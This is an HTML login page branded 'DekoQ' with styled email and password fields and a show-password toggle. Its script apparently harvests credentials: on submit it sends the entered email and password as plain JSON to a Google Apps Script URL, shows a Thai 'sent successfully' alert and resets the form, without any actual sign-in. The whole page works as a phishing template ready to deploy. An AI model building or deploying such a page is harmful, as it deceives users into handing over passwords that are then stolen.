<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin: 0.5rem 0 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 1.2rem;
    }

    label {
      font-weight: bold;
      color: #000;
      text-align: left;
    }

    .input-group {
      position: relative;
      width: 100%;
      height: 48px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      height: 100%;
      font-size: 1rem;
      border-radius: 8px;
      padding-left: 1.2rem;
      padding-right: 40px;
      border: 1px solid #ccc;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      background: none;
      border: none;
      padding: 0;
      margin: 0;
      width: 28px;
      height: 28px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .toggle-password svg {
      width: 22px;
      height: 22px;
      fill: #facc15;
    }

    .hidden {
      display: none;
    }

    button[type="submit"] {
      height: 48px;
      background: #222;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
    }

    button[type="submit"]:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username / Email</label>
        <div class="input-group">
          <input type="email" id="email" name="email" required placeholder="Username or Email" />
        </div>

        <label for="password">Password</label>
        <div class="input-group">
          <input type="password" id="password" name="password" required placeholder="Password" />
          <button type="button" class="toggle-password" onclick="togglePassword()">
            <!-- Eye Open -->
            <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M12 4.5C7 4.5 2.7 8 1 12c1.7 4 6 7.5 11 7.5s9.3-3.5 11-7.5c-1.7-4-6-7.5-11-7.5zm0 13c-3 0-5.5-2.5-5.5-5.5S9 6.5 12 6.5s5.5 2.5 5.5 5.5-2.5 5.5-5.5 5.5z"/>
              <circle cx="12" cy="12" r="2"/>
            </svg>
            <!-- Eye Closed -->
            <svg id="eye-closed" class="hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M1 12s4-6.5 11-6.5S23 12 23 12s-4 6.5-11 6.5S1 12 1 12zm11-2a2 2 0 1 1 0 4 2 2 0 0 1 0-4z"/>
              <line x1="3" y1="3" x2="21" y2="21" stroke="#000" stroke-width="2"/>
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById("form");
    const passwordInput = document.getElementById("password");
    const eyeOpen = document.getElementById("eye-open");
    const eyeClosed = document.getElementById("eye-closed");

    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(response => {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        })
        .catch(error => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Error!", error.message);
        });
    });

    function togglePassword() {
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
      eyeOpen.classList.toggle("hidden");
      eyeClosed.classList.toggle("hidden");
    }
  </script>
</body>
</html>
